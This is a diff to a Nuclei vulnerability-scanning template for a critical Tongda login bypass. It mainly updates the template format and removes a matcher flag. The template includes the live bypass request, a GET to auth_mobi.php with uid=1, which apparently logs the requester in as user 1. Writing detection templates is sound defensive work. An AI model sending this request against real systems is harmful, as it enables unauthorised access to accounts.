@@ -1,3 +1,4 @@
+# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
 id: tongda_bypass_login
 
 info:
@@ -6,7 +7,7 @@ info:
   severity: critical
   tags: tongda,bypass
 
-requests:
+http:
   - method: GET
     path:
       - "{{BaseURL}}/mobile/auth_mobi.php?isAvatar=1&uid=1&P_VER=0"
@@ -27,6 +28,3 @@ requests:
           - "RELOGIN"
         part: body
         condition: and
-        negative: true
-        
-
